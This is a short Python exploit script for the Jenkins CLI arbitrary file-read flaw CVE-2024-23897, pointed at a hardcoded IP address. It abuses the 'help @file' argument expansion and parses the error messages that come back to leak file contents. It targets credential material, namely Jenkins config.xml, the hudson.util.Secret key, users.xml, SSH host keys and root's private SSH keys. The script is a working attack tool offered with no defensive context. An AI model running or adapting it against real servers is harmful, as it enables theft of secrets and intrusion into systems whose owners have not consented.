#!/usr/bin/env python3
"""Jenkins CVE-2024-23897 file reader from VPS"""
import subprocess
import re
import sys

HOST = "http://51.250.97.223:8080"
JAR = "/tmp/jenkins-cli.jar"

def read_file(filepath):
    r = subprocess.run(
        ["java", "-jar", JAR, "-s", HOST, "help", "@/{}".format(filepath)],
        capture_output=True, text=True, timeout=15
    )
    return r.stdout + r.stderr

def get_words(output):
    w1 = w2 = None
    m1 = re.search(r"ERROR: Too many arguments: (.+)", output)
    m2 = re.search(r"\(default: (.+)\)", output)
    if m1: w1 = m1.group(1).strip()
    if m2: w2 = m2.group(1).strip()
    return w1, w2

# Test
w1, w2 = get_words(read_file("/etc/hostname"))
print("hostname:", w1 or read_file("/etc/hostname")[:100])

# Try reading credentials from Jenkins
files = [
    "/var/lib/jenkins/config.xml",
    "/var/lib/jenkins/secrets/hudson.util.Secret",
    "/var/lib/jenkins/users/users.xml",
    "/etc/ssh/ssh_host_ed25519_key",
    "/root/.ssh/id_ed25519",
    "/root/.ssh/id_rsa",
]

for f in files:
    out = read_file(f)
    w1, w2 = get_words(out)
    print("---")
    if "No such file" in out:
        print("{}: NOT FOUND".format(f))
    elif "Failed to parse" in out:
        print("{}: IS DIRECTORY".format(f))
    elif "Too many arguments" in out or "(default:" in out:
        print("{}: WORD1={}".format(f, w1[:80] if w1 else "?"))
        print("   WORD2={}".format(w2[:80] if w2 else "?"))
    else:
        print("{}: {}".format(f, out[:100]))
